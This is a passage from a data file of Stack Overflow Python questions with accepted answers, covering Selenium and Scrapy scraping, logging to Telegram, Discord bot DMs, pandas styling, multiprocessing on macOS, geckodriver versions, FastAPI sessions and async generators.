    "Body": "I am working on certain stock-related projects where I have had a task to scrape all data on a daily basis for the last 5 years. i.e from 2016 to date. I particularly thought of using selenium because I can use crawler and bot to scrape the data based on the date. So I used the use of button click with selenium and now I want the same data that is displayed by the selenium browser to be fed by scrappy.\nThis is the website I am working on right now.\nI have written the following code inside scrappy spider.\nclass FloorSheetSpider(scrapy.Spider):\n    name = \"nepse\"\n\n    def start_requests(self):\n\n        driver = webdriver.Firefox(executable_path=GeckoDriverManager().install())\n        \n     \n        floorsheet_dates = ['01/03/2016','01/04/2016', up to till date '01/10/2022']\n\n        for date in floorsheet_dates:\n            driver.get(\n                \"https://merolagani.com/Floorsheet.aspx\")\n\n            driver.find_element(By.XPATH, \"//input[@name='ctl00$ContentPlaceHolder1$txtFloorsheetDateFilter']\"\n                                ).send_keys(date)\n            driver.find_element(By.XPATH, \"(//a[@title='Search'])[3]\").click()\n            total_length = driver.find_element(By.XPATH,\n                                               \"//span[@id='ctl00_ContentPlaceHolder1_PagerControl2_litRecords']\").text\n            z = int((total_length.split()[-1]).replace(']', ''))    \n            for data in range(z, z + 1):\n                driver.find_element(By.XPATH, \"(//a[@title='Page {}'])[2]\".format(data)).click()\n                self.url = driver.page_source\n                yield Request(url=self.url, callback=self.parse)\n\n               \n    def parse(self, response, **kwargs):\n        for value in response.xpath('//tbody/tr'):\n            print(value.css('td::text').extract()[1])\n            print(\"ok\"*200)\n\nUpdate: Error after answer is\n2022-01-14 14:11:36 [twisted] CRITICAL: \nTraceback (most recent call last):\n  File \"/home/navaraj/PycharmProjects/first_scrapy/env/lib/python3.8/site-packages/twisted/internet/defer.py\", line 1661, in _inlineCallbacks\n    result = current_context.run(gen.send, result)\n  File \"/home/navaraj/PycharmProjects/first_scrapy/env/lib/python3.8/site-packages/scrapy/crawler.py\", line 88, in crawl\n    start_requests = iter(self.spider.start_requests())\nTypeError: 'NoneType' object is not iterable\n\nI want to send current web html content to scrapy feeder but I am getting unusal error for past 2 days any help or suggestions will be very much appreciated.\n",
    "AcceptedAnswerId": 70694461,
    "AcceptedAnswer": "The 2 solutions are not very different. Solution #2 fits better to your question, but choose whatever you prefer.\nSolution 1 - create a response with the html's body from the driver and scraping it right away (you can also pass it as an argument to a function):\nimport scrapy\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\nfrom scrapy.http import HtmlResponse\n\n\nclass FloorSheetSpider(scrapy.Spider):\n    name = \"nepse\"\n\n    def start_requests(self):\n\n        # driver = webdriver.Firefox(executable_path=GeckoDriverManager().install())\n        driver = webdriver.Chrome()\n\n        floorsheet_dates = ['01/03/2016','01/04/2016']#, up to till date '01/10/2022']\n\n        for date in floorsheet_dates:\n            driver.get(\n                \"https://merolagani.com/Floorsheet.aspx\")\n\n            driver.find_element(By.XPATH, \"//input[@name='ctl00$ContentPlaceHolder1$txtFloorsheetDateFilter']\"\n                                ).send_keys(date)\n            driver.find_element(By.XPATH, \"(//a[@title='Search'])[3]\").click()\n            total_length = driver.find_element(By.XPATH,\n                                               \"//span[@id='ctl00_ContentPlaceHolder1_PagerControl2_litRecords']\").text\n            z = int((total_length.split()[-1]).replace(']', ''))\n            for data in range(1, z + 1):\n                driver.find_element(By.XPATH, \"(//a[@title='Page {}'])[2]\".format(data)).click()\n                self.body = driver.page_source\n\n                response = HtmlResponse(url=driver.current_url, body=self.body, encoding='utf-8')\n                for value in response.xpath('//tbody/tr'):\n                    print(value.css('td::text').extract()[1])\n                    print(\"ok\"*200)\n\n        # return an empty requests list\n        return []\n\nSolution 2 - with super simple downloader middleware:\n(You might have a delay here in parse method so be patient).\nimport scrapy\nfrom scrapy import Request\nfrom scrapy.http import HtmlResponse\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\n\n\nclass SeleniumMiddleware(object):\n    def process_request(self, request, spider):\n        url = spider.driver.current_url\n        body = spider.driver.page_source\n        return HtmlResponse(url=url, body=body, encoding='utf-8', request=request)\n\n\nclass FloorSheetSpider(scrapy.Spider):\n    name = \"nepse\"\n\n    custom_settings = {\n        'DOWNLOADER_MIDDLEWARES': {\n            'tempbuffer.spiders.yetanotherspider.SeleniumMiddleware': 543,\n            # 'projects_name.path.to.your.pipeline': 543\n        }\n    }\n    driver = webdriver.Chrome()\n\n    def start_requests(self):\n\n        # driver = webdriver.Firefox(executable_path=GeckoDriverManager().install())\n\n\n        floorsheet_dates = ['01/03/2016','01/04/2016']#, up to till date '01/10/2022']\n\n        for date in floorsheet_dates:\n            self.driver.get(\n                \"https://merolagani.com/Floorsheet.aspx\")\n\n            self.driver.find_element(By.XPATH, \"//input[@name='ctl00$ContentPlaceHolder1$txtFloorsheetDateFilter']\"\n                                ).send_keys(date)\n            self.driver.find_element(By.XPATH, \"(//a[@title='Search'])[3]\").click()\n            total_length = self.driver.find_element(By.XPATH,\n                                               \"//span[@id='ctl00_ContentPlaceHolder1_PagerControl2_litRecords']\").text\n            z = int((total_length.split()[-1]).replace(']', ''))\n            for data in range(1, z + 1):\n                self.driver.find_element(By.XPATH, \"(//a[@title='Page {}'])[2]\".format(data)).click()\n                self.body = self.driver.page_source\n                self.url = self.driver.current_url\n\n                yield Request(url=self.url, callback=self.parse, dont_filter=True)\n\n    def parse(self, response, **kwargs):\n        print('test ok')\n        for value in response.xpath('//tbody/tr'):\n            print(value.css('td::text').extract()[1])\n            print(\"ok\"*200)\n\nNotice that I've used chrome so change it back to firefox like in your original code.\n"
}
{
    "Id": 70709406,
    "PostTypeId": 1,
    "Title": "Import \"matplotlib\" could not be resolved from source Pylance(reportMissingModuleSource)",
    "Body": "whenever I try to import matplotlib or matplotlib.pyplot in VS Code I get the error in the title:\nImport \"matplotlib\" could not be resolved from source Pylance(reportMissingModuleSource)\n\nor\nImport \"matplotlib.pyplot\" could not be resolved from source Pylance(reportMissingModuleSource)\n\nThe hyperlink of the reportMissingModuleSource sends me to https://github.com/microsoft/pylance-release/blob/main/DIAGNOSTIC_SEVERITY_RULES.md#diagnostic-severity-rules, where it says:\n\"Diagnostics for imports that have no corresponding source file. This happens when a type stub is found, but the module source file was not found, indicating that the code may fail at runtime when using this execution environment. Type checking will be done using the type stub.\"\nHowever, from the explanation I don't understand exactly what's wrong and what I should do to fix this, can someone help me with this?\n",
    "AcceptedAnswerId": 70737017,
    "AcceptedAnswer": "I can reproduce your question when I select a python interpreter where doesn't exist matplotlib:\n\nSo, the solution is opening an integrated Terminal then run pip install matplotlib. After it's installed successfully, please reload window, then the warning should go away.\n"
}
{
    "Id": 70608619,
    "PostTypeId": 1,
    "Title": "How to get message from logging function?",
    "Body": "I have a logger function from logging package that after I call it, I can send the message through logging level.\nI would like to send this message also to another function, which is a Telegram function called SendTelegramMsg().\nHow can I get the message after I call the funcion setup_logger send a message through logger.info(\"Start\") for example, and then send this exatcly same message to SendTelegramMsg() function which is inside setup_logger function?\nMy currently setup_logger function:\n# Define the logging level and the file name\ndef setup_logger(telegram_integration=False):\n    \"\"\"To setup as many loggers as you want\"\"\"\n\n    filename = os.path.join(os.path.sep, pathlib.Path(__file__).parent.resolve(), 'logs', str(dt.date.today()) + '.log')\n    formatter = logging.Formatter('%(levelname)s: %(asctime)s: %(message)s', datefmt='%m/%d/%Y %H:%M:%S')\n    level = logging.DEBUG\n\n    handler = logging.FileHandler(filename, 'a')    \n    handler.setFormatter(formatter)\n\n    consolehandler = logging.StreamHandler()\n    consolehandler.setFormatter(formatter)\n\n    logger = logging.getLogger('logs')\n    if logger.hasHandlers():\n        # Logger is already configured, remove all handlers\n        logger.handlers = []\n    else:\n        logger.setLevel(level)\n        logger.addHandler(handler)        \n        logger.addHandler(consolehandler)\n\n    #if telegram_integration == True:\n        #SendTelegramMsg(message goes here)\n\n    return logger\n\nAfter I call the function setup_logger():\nlogger = setup_logger()\nlogger.info(\"Start\")\n\nThe output:\nINFO: 01/06/2022 11:07:12: Start\n\nHow am I able to get this message and send to SendTelegramMsg() if I enable the integration to True?\n",
    "AcceptedAnswerId": 70742455,
    "AcceptedAnswer": "Implement a custom logging.Handler:\nclass TelegramHandler(logging.Handler):\n\n    def emit(self, record):\n        message = self.format(record)\n        SendTelegramMsg(message)\n        # SendTelegramMsg(message, record.levelno)    # Passing level\n        # SendTelegramMsg(message, record.levelname)  # Passing level name\n\nAdd the handler:\ndef setup_logger(telegram_integration=False):\n    # ...\n\n    if telegram_integration:\n        telegram_handler = TelegramHandler()\n        logger.addHandler(telegram_handler)\n\n    return logger\n\nUsage, no change:\nlogger = setup_logger()\nlogger.info(\"Start\")\n\n"
}
{
    "Id": 70660854,
    "PostTypeId": 1,
    "Title": "How to check if a bot can DM a user",
    "Body": "If a user has the privacy setting \"Allow direct messages from server members\" turned off and a discord bot calls\nawait user.dm_channel.send(\"Hello there\")\n\nYou'll get this error:\ndiscord.errors.Forbidden: 403 Forbidden (error code: 50007): Cannot send messages to this user\n\nI would like to check whether I can message a user without sending them a message. Trying to send a message and catching this error does not work for me, because I don't want a message to get sent in the event that the bot is allowed to message.\nI have tried this:\nprint(user.dm_channel.permissions_for(bot).send_messages)\n\nbut it always returns True, even if the message is not permitted.\nI have also tried this:\nchannel = await user.create_dm()\nif channel is None:\n    ...\n\nbut unfortunately, it seems that \"has permission to message user\" and \"has permission to create a dm channel\" are considered different.\nEDIT\nTo clarify the exact usage since there seems to be a bit of confusion, take this example. There is a server, and 3 users in question: Me, My Bot, and Steve. Steve has \"Allow direct messages from server members\" checked off.\nThe bot has a command called !newgame which accepts a list of users and starts a game amongst them, which involves DMing some of the members of the game. Because of Steve's privacy settings, he cannot play the game (since the bot will need to message him). If I do\n!newgame @DJMcMayhem @Steve\n\nI'd like to provide a response like:\n> I can't start a game with that list of users because @Steve has the wrong privacy settings.\n\nBut as far as I know right now, the only way to find out if Steve can play is by first attempting to message every user, which I'd like to avoid.\n",
    "AcceptedAnswerId": 70780850,
    "AcceptedAnswer": "Explanation\nYou can send an invalid message, which would raise a 400 Bad Request exception, to the dm_channel. This can be accomplished by setting content to None, for example.\nIf it raises 400 Bad Request, you can DM them. If it raises 403 Forbidden, you can't.\nCode\nasync def can_dm_user(user: discord.User) -> bool:\n    ch = user.dm_channel\n    if ch is None:\n        ch = await user.create_dm()\n\n    try:\n        await ch.send()\n    except discord.Forbidden:\n        return False\n    except discord.HTTPException:\n        return True\n\n"
}
{
    "Id": 70810857,
    "PostTypeId": 1,
    "Title": "split geometric progression efficiently in Python (Pythonic way)",
    "Body": "I am trying to achieve a calculation involving geometric progression (split). Is there any effective/efficient way of doing it. The data set has millions of rows.\nI need the column \"Traded_quantity\"\n\n\n\n\n\n\nMarker\nAction\nTraded_quantity\n\n\n\n\n2019-11-05\n09:25\n0\n\n0\n\n\n\n09:35\n2\nBUY\n3\n\n\n\n09:45\n0\n\n0\n\n\n\n09:55\n1\nBUY\n4\n\n\n\n10:05\n0\n\n0\n\n\n\n10:15\n3\nBUY\n56\n\n\n\n10:24\n6\nBUY\n8128\n\n\n\n\nturtle = 2\n(User defined)\nbase_quantity = 1\n(User defined)\n    def turtle_split(row):\n        if row['Action'] == 'BUY':\n            return base_quantity * (turtle ** row['Marker'] - 1) // (turtle - 1)\n        else:\n            return 0\n    df['Traded_quantity'] = df.apply(turtle_split, axis=1).round(0).astype(int)\n\nCalculation\nFor 0th Row, Traded_quantity should be zero (because the Marker is zero)\nFor 1st Row, Traded_quantity should be (1x1) + (1x2) = 3 (Marker 2 will be split into 1 and 1, First 1 will be multiplied with the base_quantity>>1x1, Second 1 will be multiplied with the result from first 1 times turtle>>1x2), then we make a sum of these two numbers)\nFor 2nd Row, Traded_quantity should be zero (because the Marker is zero)\nFor 3rd Row, Traded_quantity should be (2x2) = 4(Marker 1 will be multiplied with the last split from row 1 time turtle i.e 2x2)\nFor 4th Row, Traded_quantity should be zero(because the Marker is zero)\nFor 5th Row, Traded_quantity should be (4x2)+(4x2x2)+(4x2x2x2) = 56(Marker 3 will be split into 1,1 and 1, First 1 will be multiplied with the last split from row3 times turtle >>4x2, Second 1 will be multiplied with the result from first 1 with turtle>>8x2), third 1 will be multiplied with the result from second 1 with turtle>>16x2) then we make a sum of these three numbers)\nFor 6th Row, Traded_quantity should be (32x2)+(32x2x2)+(32x2x2x2)+(32x2x2x2x2)+(32x2x2x2x2x2) = 8128\nWhenever there will be a BUY, the traded quantity will be calculated using the last batch from Traded_quantity times turtle.\nTurns out the code is generating correct Traded_quantity when there is no zero in Marker. Once there is a gap with a couple of zeros geometric progression will not help, I would require the previous fig(from Cache) to recalculate Traded_q. tried with lru_cache for recursion, didn't work.\n",
    "AcceptedAnswerId": 70811799,
    "AcceptedAnswer": "This should work\ndef turtle_split(row):\n        global base_quantity\n        if row['Action'] == 'BUY':\n            summation = base_quantity * (turtle ** row['Marker'] - 1) // (turtle - 1)\n            base_quantity = base_quantity * (turtle ** (row['Marker'] - 1))*turtle\n            return summation\n        else:\n            return 0\n\n"
}
{
    "Id": 70565965,
    "PostTypeId": 1,
    "Title": "ERROR: Failed building wheel for numpy , ERROR: Could not build wheels for numpy, which is required to install pyproject.toml-based projects",
    "Body": "I`m using python poetry(https://python-poetry.org/) for dependency management in my project.\nThough when I`m running poetry install, its giving me below error.\nERROR: Failed building wheel for numpy\n  Failed to build numpy\n  ERROR: Could not build wheels for numpy, which is required to install pyproject.toml-based projects\n\n\nI`m having python 3.9 installed in my laptop.\nI installed numpy 1.21.5 using pip install numpy, I even tried to down version it to 1.19.5.\nThough I`m getting the same error.\nI found out many people are getting ERROR: Failed building wheel for numpy this error in python 3.10, they solved it by down versioning python to 3.9, though that didnt working for me.\n",
    "AcceptedAnswerId": 70566445,
    "AcceptedAnswer": "I solved it by doing the following steps:-\n\nI updated the pyproject.toml(This file contains all the library/dependency/dev dependency)with the numpy version that I installed using pip install numpy command.\n\n\nRun poetry lock to update poetry.lock file(contains details information about the library)\n\n\nRun poetry install again, & it should work fine.\n\n\nIf you are having any problems, you can comment.\nI`ll try to answer it.\n"
}
{
    "Id": 70546823,
    "PostTypeId": 1,
    "Title": "Pandas - How to Save A Styled Dataframe to Image",
    "Body": "I have styled a dataframe output and have gotten it to display how I want it in a Jupyter Notebook but I am having issues find a good way to save this as an image. I have tried https://pypi.org/project/dataframe-image/ but the way I have this working it seem to be a NoneType as it's a styler object and errors out when trying to use this library.\nThis is just a snippet of the whole code, this is intended to loop through several 'col_names' and I want to save these as images (to explain some of the coding).\nimport pandas as pd\nimport numpy as np\n\ncol_name = 'TestColumn'\n\ntemp_df = pd.DataFrame({'TestColumn':['A','B','A',np.nan]})\n\nt1 = (temp_df[col_name].fillna(\"Unknown\").value_counts()/len(temp_df)*100).to_frame().reset_index()\nt1.rename(columns={'index':' '}, inplace=True)\nt1[' '] = t1[' '].astype(str) \n\ndisplay(t1.style.bar(subset=[col_name], color='#5e81f2', vmax=100, vmin=0).set_table_attributes('style=\"font-size: 17px\"').set_properties(\n    **{'color': 'black !important',\n       'border': '1px black solid !important'}\n).set_table_styles([{\n    'selector': 'th',\n    'props': [('border', '1px black solid !important')]\n}]).set_properties( **{'width': '500px'}).hide_index().set_properties(subset=[\" \"], **{'text-align': 'left'}))\n\n[OUTPUT]\n\n",
    "AcceptedAnswerId": 70550426,
    "AcceptedAnswer": "Was able to change how I was using dataframe-image on the styler object and got it working. Passing it into the export() function rather than calling it off the object directly seems to be the right way to do this.\nThe .render() did get the HTML but was often losing much of the styling when converting it to image or when not viewed with Ipython HTML display. See comparision below.\n\nWorking Code:\nimport pandas as pd\nimport numpy as np\nimport dataframe_image as dfi\n\ncol_name = 'TestColumn'\n\ntemp_df = pd.DataFrame({'TestColumn':['A','B','A',np.nan]})\n\nt1 = (temp_df[col_name].fillna(\"Unknown\").value_counts()/len(temp_df)*100).to_frame().reset_index()\nt1.rename(columns={'index':' '}, inplace=True)\nt1[' '] = t1[' '].astype(str) \n\n\nstyle_test = t1.style.bar(subset=[col_name], color='#5e81f2', vmax=100, vmin=0).set_table_attributes('style=\"font-size: 17px\"').set_properties(\n    **{'color': 'black !important',\n       'border': '1px black solid !important'}\n).set_table_styles([{\n    'selector': 'th',\n    'props': [('border', '1px black solid !important')]\n}]).set_properties( **{'width': '500px'}).hide_index().set_properties(subset=[\" \"], **{'text-align': 'left'})\n\ndfi.export(style_test, 'successful_test.png')\n\n"
}
{
    "Id": 70552775,
    "PostTypeId": 1,
    "Title": "Multiprocess inherently shared memory in no longer working on python 3.10 (coming from 3.6)",
    "Body": "I understand there are a variety of techniques for sharing memory and data structures between processes in python. This question is specifically about this inherently shared memory in python scripts that existed in python 3.6 but seems to no longer exist in 3.10.  Does anyone know why and if it's possible to bring this back in 3.10?  Or what this change that I'm observing is?  I've upgraded my Mac to Monterey and it no longer supports python 3.6, so I'm forced to upgrade to either 3.9 or 3.10+.\nNote:  I tend to develop on Mac and run production on Ubuntu.  Not sure if that factors in here.  Historically with 3.6, everything behaved the same regardless of OS.\nMake a simple project with the following python files\nmyLibrary.py\nMyDict = {}\n\ntest.py\nimport threading\nimport time\nimport multiprocessing\n\nimport myLibrary\n\n\ndef InitMyDict():\n    myLibrary.MyDict = {'woot': 1, 'sauce': 2}\n    print('initialized myLibrary.MyDict to ', myLibrary.MyDict)\n\n\ndef MainLoop():\n    numOfSubProcessesToStart = 3\n    for i in range(numOfSubProcessesToStart):\n        t = threading.Thread(\n            target=CoolFeature(),\n            args=())\n        t.start()\n\n    while True:\n        time.sleep(1)\n\n\ndef CoolFeature():\n    MyProcess = multiprocessing.Process(\n        target=SubProcessFunction,\n        args=())\n    MyProcess.start()\n\n\ndef SubProcessFunction():\n    print('SubProcessFunction: ', myLibrary.MyDict)\n\n\nif __name__ == '__main__':\n    InitMyDict()\n    MainLoop()\n\nWhen I run this on 3.6 it has a significantly different behavior than 3.10.  I do understand that a subprocess cannot modify the memory of the main process, but it is still super convenient to access the main process' data structure that was previously set up as opposed to moving every little tiny thing into shared memory just to read a simple dictionary/int/string/etc.\nPython 3.10 output:\npython3.10 test.py \ninitialized myLibrary.MyDict to  {'woot': 1, 'sauce': 2}\nSubProcessFunction:  {}\nSubProcessFunction:  {}\nSubProcessFunction:  {}\n\nPython 3.6 output:\npython3.6 test.py \ninitialized myLibrary.MyDict to  {'woot': 1, 'sauce': 2}\nSubProcessFunction:  {'woot': 1, 'sauce': 2}\nSubProcessFunction:  {'woot': 1, 'sauce': 2}\nSubProcessFunction:  {'woot': 1, 'sauce': 2}\n\nObservation:\nNotice that in 3.6, the subprocess can view the value that was set from the main process.  But in 3.10, the subprocess sees an empty dictionary.\n",
    "AcceptedAnswerId": 70552892,
    "AcceptedAnswer": "In short, since 3.8, CPython uses the spawn start method on MacOs. Before it used the fork method.\nOn UNIX platforms, the fork start method is used which means that every new multiprocessing process is an exact copy of the parent at the time of the fork.\nThe spawn method means that it starts a new Python interpreter for each new multiprocessing process. According to the documentation:\n\nThe child process will only inherit those resources necessary to run the process object\u2019s run() method.\n\nIt will import your program into this new interpreter, so starting processes et cetera sould only be done from within the if __name__ == '__main__':-block!\nThis means you cannot count on variables from the parent process being available in the children, unless they are module level constants which would be imported.\nSo the change is significant.\nWhat can be done?\nIf the required information could be a module-level constant, that would solve the problem in the simplest way.\nIf that is not possible (e.g. because the data needs to be generated at runtime) you could have the parent write the information to be shared to a file. E.g. in JSON format and before it starts other processes. Then the children could simply read this. That is probably the next simplest solution.\nUsing a multiprocessing.Manager would allow you to share a dict between processes. There is however a certain amount of overhead associated with this.\nOr you could try calling multiprocessing.set_start_method(\"fork\") before creating processes or pools and see if it doesn't crash in your case. That would revert to the pre-3.8 method on MacOs. But as documented in this bug, there are real problems with using the fork method on MacOs.\nReading the issue indicates that fork might be OK as long as you don't use threads.\n"
}
{
    "Id": 70583230,
    "PostTypeId": 1,
    "Title": "Union of generic types that is also generic",
    "Body": "Say I have two types (one of them generic) like this\nfrom typing import Generic, TypeVar\nT = TypeVar('T')\nclass A(Generic[T]): pass\nclass B: pass\n\nAnd a union of A and B like this\nC = A|B\n\nOr, in pre-Python-3.10/PEP 604-syntax:\nC = Union[A,B]\n\nHow do I have to change the definition of C, so that C is also generic? e.g. if an object is of type C[int], it is either\n\nof type A[int] (type parameter is passed down) or\nof type B (type parameter is ignored)\n\n",
    "AcceptedAnswerId": 70588199,
    "AcceptedAnswer": "Rereading the mypy documentation I believe I have found my answer:\n\nType aliases can be generic. In this case they can be used in two ways: Subscripted aliases are equivalent to original types with substituted type variables, so the number of type arguments must match the number of free type variables in the generic type alias. Unsubscripted aliases are treated as original types with free variables replaced with Any\n\nSo, to answer my question:\nC = A[T]|B\n\nshould do the trick. And it does!\n"
}
{
    "Id": 70567344,
    "PostTypeId": 1,
    "Title": "EasyOCR Segmentation fault (core dumped)",
    "Body": "I got this issue\npip install easyocr\n\non python env\nimport easyocr\nreader = easyocr.Reader(['en'])\n\nresult = reader.readtext('./reports/dilate/NP6221833_126.png', workers=1)\n\nfinally\nSegmentation fault (core dumped)\n\n",
    "AcceptedAnswerId": 70567354,
    "AcceptedAnswer": "Solved downgrading to the nov 2021 version of opencv\npip install opencv-python-headless==4.5.4.60\n\n"
}
{
    "Id": 70821737,
    "PostTypeId": 1,
    "Title": "WebDriverException: Message: Service geckodriver unexpectedly exited. Status code was: 64 error using Selenium Geckodriver Firefox in FreeBSD jail",
    "Body": "For some tests, I've set up a plain new TrueNAS 12.3 FreeBSD Jail and started it, then installed python3, firefox, geckodriver and pip using the following commands:\npkg install python3 firefox geckodriver py38-pip\npip install --upgrade pip\nsetenv CRYPTOGRAPHY_DONT_BUILD_RUST 1\npip install cryptography==3.4.7\npip install selenium\n\nAfterwards, when I want to use Selenium with Firefox in my Python code, it does not work:\nfrom selenium import webdriver\nfrom selenium.webdriver.firefox.options import Options\noptions = Options()\noptions.headless = True\ndriver = webdriver.Firefox(options=options)\n\nit brings\nTraceback (most recent call last):\n  File \"\", line 1, in \n  File \"/usr/local/lib/python3.8/site-packages/selenium/webdriver/firefox/webdriver.py\", line 174, in __init__\n    self.service.start()\n  File \"/usr/local/lib/python3.8/site-packages/selenium/webdriver/common/service.py\", line 98, in start\n    self.assert_process_still_running()\n  File \"/usr/local/lib/python3.8/site-packages/selenium/webdriver/common/service.py\", line 110, in assert_process_still_running\n    raise WebDriverException(\nselenium.common.exceptions.WebDriverException: Message: Service geckodriver unexpectedly exited. Status code was: 64\n\nFunnily, on another Jail that I've set up approximately a year ago (approximately in the mentioned way as well), it just works and does not throw the error (so different versions maybe?)!\nThis is the only content of geckodriver.log:\ngeckodriver: error: Found argument '--websocket-port' which wasn't expected, orisn't valid in this context\n\nUSAGE:\n    geckodriver [FLAGS] [OPTIONS]\n\nFor more information try --help\n\nIs there anything I could try to get it working? I've already seen this question, but it seems fairly outdated.\nFirefox 95.0.2, geckodriver 0.26.0, Python 3.8.12, Selenium 4.1.0\n",
    "AcceptedAnswerId": 70822145,
    "AcceptedAnswer": "This error message...\nselenium.common.exceptions.WebDriverException: Message: Service geckodriver unexpectedly exited. Status code was: 64\n\nand the GeckoDriver log...\ngeckodriver: error: Found argument '--websocket-port' which wasn't expected, orisn't valid in this context\n\n...implies that the GeckoDriver was unable to initiate/spawn a new Browsing Context i.e. firefox session.\n\nYour main issue is the incompatibility between the version of the binaries you are using as follows:\n\nYour Selenium Client version is 4.1.0.\nBut your GeckoDriver version is 0.26.0.\n\nAs @ernstki mentions in their comment:\n\nYou are running a geckodriver older than 0.30.0, and it is missing the --websocket-port option, which newer/new-ish versions of Selenium seem to depend on.\n\nTo put it in simple words, till the previous GeckoDriver release of v0.29.0 the --websocket-port option wasn't in use, which is now mandatory with Selenium v4.0.1.\nFurther @whimboo also confirmed in his comment:\n\nAs it has been manifested the problem here is not geckodriver but Selenium. As such you should create an issue on the Selenium repository instead, so that an option could be added to not always pass the --websocket-port argument. If that request gets denied you will have to use older releases of Selenium if testing with older geckodriver releases is really needed.\n\n\nSolution\nEnsure that:\n\nSelenium is upgraded to current levels Version 4.1.0.\nGeckoDriver is upgraded to GeckoDriver v0.30.0 level.\nFirefox is upgraded to current Firefox v96.0.2 levels.\n\n\nFreeBSD versions\nIncase you are using FreeBSD versions where the GeckoDriver versions are older, in those cases you have to downgrade Selenium to v3.x levels.\nCommands (courtesy: Kurtibert):\n\nUninstall Selenium:\npip3 uninstall selenium;\n\n\nInstall Selenium:\npip3 install 'selenium<4.0.0'\n\n\n\n"
}
{
    "Id": 70596809,
    "PostTypeId": 1,
    "Title": "Can a class attribute shadow a built-in in Python?",
    "Body": "If have some code like this:\nclass Foo():\n   def open(self, bar):\n       # Doing some fancy stuff here, i.e. opening \"bar\"\n       pass\n\nWhen I run flake8 with the flake8-builtins plug-in I get the error\nA003 class attribute \"open\" is shadowing a python builtin\n\nI don't understand how the method could possibly shadow the built-in open-function, because the method can only be called using an instance (i.e. self.open(\"\") or someFoo.open(\"\")). Is there some other way code expecting to call the built-in ends up calling the method? Or is this a false positive of the flake8-builtins plug-in?\n",
    "AcceptedAnswerId": 70597023,
    "AcceptedAnswer": "Not really a practical case, but your code would fail if you wanted to use the built-it functions on the class level after your shadowed function has been initialized:\nclass Foo:\n    def open(self, bar):\n        pass\n\n    with open('myfile.txt'):\n        print('did I get here?')\n\n>>> TypeError: open() missing 1 required positional argument: 'bar'\n\nThe same would also be true with other built-in functions, such as print\nclass Foo:\n    def print(self, bar):\n        pass\n\n    print('did I get here?')\n\n>>> TypeError: print() missing 1 required positional argument: 'bar'\n\n"
}
{
    "Id": 70617258,
    "PostTypeId": 1,
    "Title": "session object in Fastapi similar to flask",
    "Body": "I am trying to use session to pass variables across view functions in fastapi. However, I do not find any doc which specifically says of about session object. Everywhere I see, cookies are used. Is there any way to convert the below flask code in fastapi? I want to keep session implementation as simple as possible.\nfrom flask import Flask, session, render_template, request, redirect, url_for\n\n\napp=Flask(__name__)\napp.secret_key='asdsdfsdfs13sdf_df%&'   \n\n@app.route('/a')\ndef a():\n    session['my_var'] = '1234'              \n    return redirect(url_for('b'))          \n\n\n@app.route('/b')\ndef b():\n    my_var = session.get('my_var', None)\n    return my_var    \n\n\nif __name__=='__main__':\n    app.run(host='0.0.0.0', port=5000, debug = True)\n\n",
    "AcceptedAnswerId": 70630483,
    "AcceptedAnswer": "Take a look at Starlette's SessionMiddleware. FastAPI uses Starlette under the hood so it is compatible.\nAfter you register SessionMiddleware, you can access Request.session, which is a dictionary.\nDocumentation: SessionMiddleware\nAn implementation in FastAPI may look like:\n@app.route(\"/a\")\nasync def a(request: Request) -> RedirectResponse:\n\n    request.session[\"my_var\"] = \"1234\"\n\n    return RedirectResponse(\"/b\")\n\n@app.route(\"/b\")\nasync def b(request: Request) -> PlainTextResponse:\n\n    my_var = request.session.get(\"my_var\", None)\n\n    return PlainTextResponse(my_var)\n\n"
}
{
    "Id": 70876394,
    "PostTypeId": 1,
    "Title": "async_generator' object is not iterable",
    "Body": "I need to return a value in async function.\nI tried to use synchronous form of return:\nimport asyncio\n\nasync def main():\n    for i in range(10):\n        return i\n        await asyncio.sleep(1)\n\nprint(asyncio.run(main()))\n\noutput:\n0 [Finished in 204ms]\nBut it just return value of the first loop, which is not expexted. So changed the code as below:\nimport asyncio\n\nasync def main():\n    for i in range(10):\n        yield i\n        await asyncio.sleep(1)\n\nfor _ in main():\n    print(_)\n\noutput:\nTypeError: 'async_generator' object is not iterable\nby using async generator I am facing with this error. How can I return a value for every loop of async function?\nThanks\n",
    "AcceptedAnswerId": 70876749,
    "AcceptedAnswer": "You need to use an async for which itself needs to be inside an async function:\nasync def get_result():\n    async for i in main():\n        print(i)\n\nasyncio.run(get_result())\n\n"
}
{
    "Id": 70587271,
    "PostTypeId": 1,
    "Title": "Is there a Pythonic way of filtering substrings of strings in a list?",
    "Body": "I have a list with strings as below.\ncandidates = [\"Hello\", \"World\", \"HelloWorld\", \"Foo\", \"bar\", \"ar\"]\n\nAnd I want the list to be filtered as [\"HelloWorld\", \"Foo\", \"Bar\"], because others are substrings. I can do it like this, but don't think it's fast or elegant.\ndef filter_not_substring(candidates):\n    survive = []\n    for a in candidates:\n        for b in candidates:\n            if a == b:\n                continue\n            if a in b:\n                break\n        else:\n            survive.append(a)\n    return survive\n\nIs there any fast way to do it?\n",
    "AcceptedAnswerId": 70587308,
    "AcceptedAnswer": "How about:\ncandidates = [\"Hello\", \"World\", \"HelloWorld\", \"Foo\", \"bar\", \"ar\"]\nresult = [c for c in candidates if not any(c in o and len(o) > len(c) for o in candidates)]\nprint(result)\n\nCounter to what was suggested in the comments:\nfrom timeit import timeit\n\n\ndef filter_not_substring(candidates):\n    survive = []\n    for a in candidates:\n        for b in candidates:\n            if a == b:\n                continue\n            if a in b:\n                break\n        else:\n            survive.append(a)\n    return survive\n\n\ndef filter_not_substring2a(candidates):\n    return [c for c in candidates if not any(len(o) > len(c) and c in o for o in candidates)]\n\n\ndef filter_not_substring2b(candidates):\n    return [c for c in candidates if not any(c in o and len(o) > len(c) for o in candidates)]\n\n\nxs = [\"Hello\", \"World\", \"HelloWorld\", \"Foo\", \"bar\", \"ar\", \"bar\"]\nprint(filter_not_substring(xs), filter_not_substring2a(xs), filter_not_substring2b(xs))\nprint(timeit(lambda: filter_not_substring(xs)))\nprint(timeit(lambda: filter_not_substring2a(xs)))\nprint(timeit(lambda: filter_not_substring2b(xs)))\n\nResult:\n['HelloWorld', 'Foo', 'bar', 'bar'] ['HelloWorld', 'Foo', 'bar', 'bar'] ['HelloWorld', 'Foo', 'bar', 'bar']\n1.5163685\n4.6516653\n3.8334089999999996\n\nSo, OP's solution is substantially faster, but filter_not_substring2b is still about 20% faster than 2a. So, putting the len comparison first doesn't save time.\nFor any production scenario, OP's function is probably optimal - a way to speed it up might be to bring the whole problem into C, but I doubt that would show great gains, since the logic is pretty straightforward already and 